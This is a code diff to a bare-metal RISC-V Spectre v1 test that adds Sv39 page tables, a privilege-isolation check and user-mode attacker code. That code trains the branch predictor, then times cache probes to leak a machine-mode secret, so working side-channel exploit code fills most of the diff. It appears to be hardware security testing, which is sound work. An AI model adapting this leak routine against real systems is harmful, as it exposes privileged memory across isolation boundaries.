@@ -75,8 +75,35 @@
 
 #define MCAUSE_USER_ECALL 8u
 #define MCAUSE_SUPERVISOR_ECALL 9u
+#define MCAUSE_LOAD_ACCESS_FAULT 5u
+#define MCAUSE_LOAD_PAGE_FAULT 13u
 #define SCAUSE_SUPERVISOR_ECALL 9u
 #define MSTATUS_MPP_MASK (3ull << 11)
+
+#define PAGE_SHIFT 12u
+#define PAGE_SIZE (1ull << PAGE_SHIFT)
+#define PTES_PER_PT 512u
+#define SATP_MODE_SV39 (8ull << 60)
+#define VPTE_V (1ull << 0)
+#define VPTE_R (1ull << 1)
+#define VPTE_W (1ull << 2)
+#define VPTE_X (1ull << 3)
+#define VPTE_U (1ull << 4)
+#define VPTE_A (1ull << 6)
+#define VPTE_D (1ull << 7)
+
+#define PUBLIC_ARRAY1_SZ 16u
+#define PAGE_TABLE_ATTACKER (!(DIRECT_SERVICE_CALL) && !(USE_AM_CTE))
+#define U_TEXT __attribute__((section(".u_text"), noinline, aligned(16)))
+#define U_DATA __attribute__((section(".u_data"), aligned(4096)))
+#define M_SECRET __attribute__((section(".m_secret"), aligned(4096)))
+
+asm(
+    ".section .u_text,\"ax\",@progbits\n"
+    ".balign 4096\n"
+    ".globl __u_text_start\n"
+    "__u_text_start:\n"
+    ".previous\n");
 
 struct victim_region {
   uint8_t array1[16];
@@ -84,14 +111,14 @@ struct victim_region {
   uint8_t secret[16];
 } __attribute__((packed, aligned(64)));
 
-static struct victim_region b_region = {
+static struct victim_region M_SECRET b_region = {
   .array1 = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16},
   .secret = "S3CreT",
 };
 
-static volatile uint64_t b_array1_sz = 16;
-static uint8_t __attribute__((aligned(4096))) a_probe[PROBE_ENTRIES * PROBE_STRIDE];
-static uint8_t __attribute__((aligned(16))) u_stack[4096];
+static volatile uint64_t __attribute__((section(".m_secret"))) b_array1_sz = PUBLIC_ARRAY1_SZ;
+static uint8_t U_DATA a_probe[PROBE_ENTRIES * PROBE_STRIDE];
+static uint8_t U_DATA u_stack[4096];
 
 static volatile uint8_t m_dummy;
 static volatile uint64_t trap_count;
@@ -105,11 +132,143 @@ static volatile int attack_done;
 static volatile int attack_status;
 static uintptr_t saved_m_sp;
 
-static uint8_t leaked_idx[SECRET_SZ][2];
-static uint64_t leaked_score[SECRET_SZ][2];
-static uint64_t active_threshold;
+static uint8_t U_DATA leaked_idx[SECRET_SZ][2];
+static uint64_t U_DATA leaked_score[SECRET_SZ][2];
+static uint64_t U_DATA active_threshold;
+static volatile uint64_t U_DATA direct_secret_fault_expected;
+static volatile uint64_t U_DATA direct_secret_fault_seen;
+static volatile uint64_t U_DATA direct_secret_read_completed;
+static volatile uint64_t U_DATA direct_secret_read_value;
 
-static inline uint64_t candidate_value(uint64_t idx)
+static uint64_t root_pt[PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
+static uint64_t l1_pts[4][PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
+static uint64_t l0_pts[32][PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
+static uint64_t l1_used;
+static uint64_t l0_used;
+
+extern char __u_text_start[];
+extern char __u_text_end[];
+
+static inline uintptr_t page_down(uintptr_t addr)
+{
+  return addr & ~(uintptr_t)(PAGE_SIZE - 1);
+}
+
+static inline uintptr_t page_up(uintptr_t addr)
+{
+  return (addr + PAGE_SIZE - 1) & ~(uintptr_t)(PAGE_SIZE - 1);
+}
+
+static void zero_page(void *page)
+{
+  uint64_t *p = (uint64_t *)page;
+  for (uint64_t i = 0; i < PTES_PER_PT; ++i)
+    p[i] = 0;
+}
+
+static int alloc_l1(void)
+{
+  if (l1_used >= 4)
+    return -1;
+  zero_page(l1_pts[l1_used]);
+  return (int)l1_used++;
+}
+
+static int alloc_l0(void)
+{
+  if (l0_used >= 32)
+    return -1;
+  zero_page(l0_pts[l0_used]);
+  return (int)l0_used++;
+}
+
+static uint64_t *walk_page(uintptr_t va, int alloc)
+{
+  uintptr_t vpn2 = (va >> 30) & 0x1ffu;
+  uintptr_t vpn1 = (va >> 21) & 0x1ffu;
+  uintptr_t vpn0 = (va >> 12) & 0x1ffu;
+  uint64_t *l1;
+  uint64_t *l0;
+  int idx;
+
+  if ((root_pt[vpn2] & VPTE_V) == 0) {
+    if (!alloc)
+      return NULL;
+    idx = alloc_l1();
+    if (idx < 0)
+      return NULL;
+    root_pt[vpn2] = (((uintptr_t)l1_pts[idx] >> PAGE_SHIFT) << 10) | VPTE_V;
+  }
+  l1 = (uint64_t *)(((root_pt[vpn2] >> 10) << PAGE_SHIFT));
+
+  if ((l1[vpn1] & VPTE_V) == 0) {
+    if (!alloc)
+      return NULL;
+    idx = alloc_l0();
+    if (idx < 0)
+      return NULL;
+    l1[vpn1] = (((uintptr_t)l0_pts[idx] >> PAGE_SHIFT) << 10) | VPTE_V;
+  }
+  l0 = (uint64_t *)(((l1[vpn1] >> 10) << PAGE_SHIFT));
+  return &l0[vpn0];
+}
+
+static int map_identity_page(uintptr_t va, uint64_t perm)
+{
+  uint64_t *pte = walk_page(va, 1);
+  if (pte == NULL)
+    return -1;
+  *pte = ((va >> PAGE_SHIFT) << 10) | VPTE_V | VPTE_A | perm |
+         ((perm & VPTE_W) ? VPTE_D : 0);
+  return 0;
+}
+
+static int map_identity_range(uintptr_t start, uintptr_t end, uint64_t perm)
+{
+  uintptr_t cur = page_down(start);
+  uintptr_t limit = page_up(end);
+  for (; cur < limit; cur += PAGE_SIZE) {
+    if (map_identity_page(cur, perm) != 0)
+      return -1;
+  }
+  return 0;
+}
+
+static void install_priv_page_table(void)
+{
+  zero_page(root_pt);
+  l1_used = 0;
+  l0_used = 0;
+
+  if (map_identity_range((uintptr_t)__u_text_start, (uintptr_t)__u_text_end,
+                         VPTE_R | VPTE_X | VPTE_U) != 0)
+    panic("map u_text failed");
+  if (map_identity_range((uintptr_t)a_probe, (uintptr_t)a_probe + sizeof(a_probe),
+                         VPTE_R | VPTE_W | VPTE_U) != 0)
+    panic("map a_probe failed");
+  if (map_identity_range((uintptr_t)u_stack, (uintptr_t)u_stack + sizeof(u_stack),
+                         VPTE_R | VPTE_W | VPTE_U) != 0)
+    panic("map u_stack failed");
+  if (map_identity_range((uintptr_t)leaked_idx, (uintptr_t)leaked_idx + sizeof(leaked_idx),
+                         VPTE_R | VPTE_W | VPTE_U) != 0)
+    panic("map leaked_idx failed");
+  if (map_identity_range((uintptr_t)leaked_score, (uintptr_t)leaked_score + sizeof(leaked_score),
+                         VPTE_R | VPTE_W | VPTE_U) != 0)
+    panic("map leaked_score failed");
+  if (map_identity_range((uintptr_t)&active_threshold,
+                         (uintptr_t)&direct_secret_read_value + sizeof(direct_secret_read_value),
+                         VPTE_R | VPTE_W | VPTE_U) != 0)
+    panic("map u_shared failed");
+  if (map_identity_range((uintptr_t)&b_region,
+                         (uintptr_t)&b_array1_sz + sizeof(b_array1_sz),
+                         VPTE_R | VPTE_W) != 0)
+    panic("map m_secret failed");
+
+  uintptr_t satp = SATP_MODE_SV39 | (((uintptr_t)root_pt) >> PAGE_SHIFT);
+  asm volatile("csrw satp, %0\nsfence.vma zero, zero\nfence.i" :: "r"(satp) : "memory");
+}
+
+static U_TEXT uint64_t candidate_value(uint64_t idx)
 {
   if (idx < 10)
     return '0' + idx;
@@ -118,22 +277,22 @@ static inline uint64_t candidate_value(uint64_t idx)
   return 'a' + (idx - 36);
 }
 
-static inline uint64_t candidate_probe_value(uint64_t idx)
+static U_TEXT uint64_t candidate_probe_value(uint64_t idx)
 {
   return candidate_value((idx * 17u + 13u) % 62u);
 }
 
-static int is_training_value(uint64_t value)
+static U_TEXT int is_training_value(uint64_t value)
 {
-  for (uint64_t i = 0; i < sizeof(b_region.array1); ++i) {
-    if (value == b_region.array1[i])
+  for (uint64_t i = 1; i <= PUBLIC_ARRAY1_SZ; ++i) {
+    if (value == i)
       return 1;
   }
   return 0;
 }
 
-static void top_two_idx(uint64_t *in, uint64_t count,
-                        uint8_t out_idx[2], uint64_t out_score[2])
+static U_TEXT void top_two_idx(uint64_t *in, uint64_t count,
+                               uint8_t out_idx[2], uint64_t out_score[2])
 {
   out_idx[0] = 0;
   out_idx[1] = 0;
@@ -150,6 +309,41 @@ static void top_two_idx(uint64_t *in, uint64_t count,
       out_score[1] = in[i];
       out_idx[1] = i;
     }
+  }
+}
+
+static U_TEXT uint64_t u_probe_time(volatile uint8_t *addr)
+{
+  uint64_t start;
+  uint64_t end;
+  uint8_t dummy;
+
+  asm volatile(
+      "fence rw, rw\n"
+      "rdcycle %[start]\n"
+      "lbu %[dummy], 0(%[addr])\n"
+      "fence rw, rw\n"
+      "rdcycle %[end]\n"
+      : [start] "=&r"(start), [end] "=&r"(end), [dummy] "=&r"(dummy)
+      : [addr] "r"(addr)
+      : "memory");
+  (void)dummy;
+  return end - start;
+}
+
+static U_TEXT void probe_direct_secret_access(void)
+{
+  uint64_t value = 0;
+
+  direct_secret_fault_seen = 0;
+  direct_secret_read_completed = 0;
+  direct_secret_read_value = 0;
+  direct_secret_fault_expected = 1;
+  asm volatile("lbu %0, 0(%1)" : "=&r"(value) : "r"(b_region.secret) : "memory");
+  direct_secret_fault_expected = 0;
+  if (!direct_secret_fault_seen) {
+    direct_secret_read_value = value;
+    direct_secret_read_completed = 1;
   }
 }
 
@@ -205,6 +399,13 @@ void m_trap_dispatch(uint64_t cause, uint64_t epc,
   attack_done = 1;
   return;
 #endif
+
+  if ((cause == MCAUSE_LOAD_ACCESS_FAULT || cause == MCAUSE_LOAD_PAGE_FAULT) &&
+      direct_secret_fault_expected != 0) {
+    direct_secret_fault_seen = 1;
+    direct_secret_fault_expected = 0;
+    return;
+  }
 
   if (cause != MCAUSE_USER_ECALL && cause != MCAUSE_SUPERVISOR_ECALL) {
     bad_trap_count++;
@@ -284,7 +485,7 @@ asm(
 
 void low_ecall_smoke_entry(void);
 asm(
-    ".section .text\n"
+    ".section .u_text,\"ax\",@progbits\n"
     ".align 2\n"
     ".globl low_ecall_smoke_entry\n"
     "low_ecall_smoke_entry:\n"
@@ -293,7 +494,7 @@ asm(
     "  ecall\n"
     "1: j 1b\n");
 
-static inline void svc_victim(uint64_t idx, volatile uint8_t *probe)
+static U_TEXT void svc_victim(uint64_t idx, volatile uint8_t *probe)
 {
 #if DIRECT_SERVICE_CALL
   m_trap_dispatch(MCAUSE_SUPERVISOR_ECALL, 0, idx, (uint64_t)probe, SVC_VICTIM);
@@ -305,7 +506,7 @@ static inline void svc_victim(uint64_t idx, volatile uint8_t *probe)
 #endif
 }
 
-static inline void svc_flush_probe(volatile uint8_t *probe)
+static U_TEXT void svc_flush_probe(volatile uint8_t *probe)
 {
 #if DIRECT_SERVICE_CALL
   m_trap_dispatch(MCAUSE_SUPERVISOR_ECALL, 0, (uint64_t)probe, 0, SVC_FLUSH_PROBE);
@@ -316,7 +517,7 @@ static inline void svc_flush_probe(volatile uint8_t *probe)
 #endif
 }
 
-static inline void svc_exit(uint64_t status)
+static U_TEXT void svc_exit(uint64_t status)
 {
 #if DIRECT_SERVICE_CALL
   m_trap_dispatch(MCAUSE_SUPERVISOR_ECALL, 0, status, 0, SVC_EXIT);
@@ -329,16 +530,22 @@ static inline void svc_exit(uint64_t status)
 #endif
 }
 
-static __attribute__((noinline)) int attacker_run(void)
+static U_TEXT int attacker_run(void)
 {
   uint64_t malicious_base =
       (uintptr_t)b_region.secret - (uintptr_t)b_region.array1;
-  uint64_t local_status = 0;
 
 #if CONTROL_ONLY
+#if PAGE_TABLE_ATTACKER
+  probe_direct_secret_access();
+#endif
   svc_flush_probe(a_probe);
   svc_victim(0, a_probe);
   return 0;
+#endif
+
+#if PAGE_TABLE_ATTACKER
+  probe_direct_secret_access();
 #endif
 
   for (uint64_t len = 0; len < SECRET_SZ; ++len) {
@@ -350,7 +557,7 @@ static __attribute__((noinline)) int attacker_run(void)
       svc_flush_probe(a_probe);
 
       for (int64_t j = ((TRAIN_TIMES + 1) * ROUNDS) - 1; j >= 0; --j) {
-        uint64_t rand_idx = atk_round % b_array1_sz;
+        uint64_t rand_idx = atk_round % PUBLIC_ARRAY1_SZ;
         uint64_t attack_idx = malicious_base + len;
         uint64_t pass_idx = ((j % (TRAIN_TIMES + 1)) - 1) & ~0xffffUL;
         pass_idx = pass_idx | (pass_idx >> 16);
@@ -366,27 +573,31 @@ static __attribute__((noinline)) int attacker_run(void)
         uint64_t mixed_i = candidate_probe_value(i);
         if (is_training_value(mixed_i))
           continue;
-        uint64_t elapsed = xs_probe_time(&a_probe[mixed_i * PROBE_STRIDE]);
+        uint64_t elapsed = u_probe_time(&a_probe[mixed_i * PROBE_STRIDE]);
         if (elapsed < active_threshold)
           results[mixed_i]++;
       }
     }
 
     top_two_idx(results, PROBE_ENTRIES, leaked_idx[len], leaked_score[len]);
-    if (leaked_idx[len][0] != b_region.secret[len] &&
-        leaked_idx[len][1] != b_region.secret[len])
-      local_status = 1;
   }
 
-  return (int)local_status;
+  return 0;
 }
 
-static __attribute__((noinline, noreturn, unused)) void attacker_entry(void)
+static U_TEXT __attribute__((noreturn, unused)) void attacker_entry(void)
 {
   svc_exit((uint64_t)attacker_run());
   for (;;)
     asm volatile("wfi");
 }
+
+asm(
+    ".section .u_text,\"ax\",@progbits\n"
+    ".balign 4096\n"
+    ".globl __u_text_end\n"
+    "__u_text_end:\n"
+    ".previous\n");
 
 #if USE_AM_CTE
 static _Context *service_ecall_handler(_Event *ev, _Context *ctx) __attribute__((unused));
@@ -438,6 +649,7 @@ static void enter_user_attacker(void)
   asm volatile("csrw mtvec, %0" :: "r"((uintptr_t)m_trap_entry) : "memory");
   asm volatile("csrw medeleg, zero\ncsrw mideleg, zero" ::: "memory");
   asm volatile("li t0, -1\ncsrw mcounteren, t0\ncsrw scounteren, t0" ::: "t0", "memory");
+  install_priv_page_table();
   asm volatile("mv %0, sp" : "=r"(saved_m_sp));
 
   asm volatile("csrr %0, mstatus" : "=r"(mstatus));
@@ -476,14 +688,17 @@ int main(void)
     active_threshold = CACHE_HIT_THRESHOLD;
 #endif
 
-  printf("[v1-priv] model=interface A=%s B=M pmp=off service=%s secret_sz=%d candidates=%d flush_lines=%d control_only=%d\n",
+  printf("[v1-priv] model=%s A=%s B=M pmp=%s satp=%s service=%s secret_sz=%d candidates=%d flush_lines=%d control_only=%d\n",
+         PAGE_TABLE_ATTACKER ? "page-table-interface" : "interface",
          ATTACKER_MPP == 0 ? "U" : "S",
+         PAGE_TABLE_ATTACKER ? "open" : "off",
+         PAGE_TABLE_ATTACKER ? "sv39" : "off",
          DIRECT_SERVICE_CALL ? "direct-dispatch" : (USE_AM_CTE ? "am-cte-ecall" : "machine-ecall"),
          SECRET_SZ, PROBE_CANDIDATES, FLUSH_LINES, CONTROL_ONLY);
   printf("[v1-priv] calibration fallback=%d measured=%lu threshold=%lu fixed=%d\n",
          CACHE_HIT_THRESHOLD, measured_threshold, active_threshold,
          USE_FIXED_CACHE_HIT_THRESHOLD);
-  printf("[v1-priv] service_return=no-secret direct_secret_access=not-attempted\n");
+  printf("[v1-priv] service_return=no-secret direct_secret_access=expect-fault\n");
   printf("[v1-priv] b_array1=%p b_secret=%p malicious_base=%lu probe=%p\n",
          b_region.array1, b_region.secret,
          (uint64_t)((uintptr_t)b_region.secret - (uintptr_t)b_region.array1),
@@ -501,10 +716,15 @@ int main(void)
   enter_user_attacker();
 #endif
 
+  printf("[v1-priv] isolation direct_secret_fault=%lu direct_secret_completed=%lu direct_secret_value=0x%02lx u_text=[%p,%p) m_secret=%p\n",
+         direct_secret_fault_seen, direct_secret_read_completed,
+         direct_secret_read_value & 0xfful,
+         __u_text_start, __u_text_end, b_region.secret);
   printf("[v1-priv] traps=%lu victim_calls=%lu flush_calls=%lu exit_calls=%lu bad_traps=%lu last_mcause=%lu last_mepc=%p status=%d\n",
          trap_count, victim_call_count, flush_call_count, exit_call_count,
          bad_trap_count, last_mcause, (void *)last_mepc, attack_status);
 
+  int leak_ok = 1;
   for (uint64_t i = 0; i < SECRET_SZ; ++i) {
     uint8_t guess = leaked_idx[i][0];
     uint8_t second = leaked_idx[i][1];
@@ -514,9 +734,14 @@ int main(void)
            expected, expected,
            (guess >= 32 && guess < 127) ? guess : '?', guess, leaked_score[i][0],
            (second >= 32 && second < 127) ? second : '?', second, leaked_score[i][1]);
+    if (guess != expected && second != expected)
+      leak_ok = 0;
   }
 
-  int pass = (attack_status == 0 && bad_trap_count == 0);
+  int isolation_ok = !PAGE_TABLE_ATTACKER ||
+                     (direct_secret_fault_seen != 0 &&
+                      direct_secret_read_completed == 0);
+  int pass = (attack_status == 0 && bad_trap_count == 0 && isolation_ok && leak_ok);
   printf("[v1-priv] check=%s\n", pass ? "PASS" : "FAIL");
   return pass ? 0 : 1;
 }
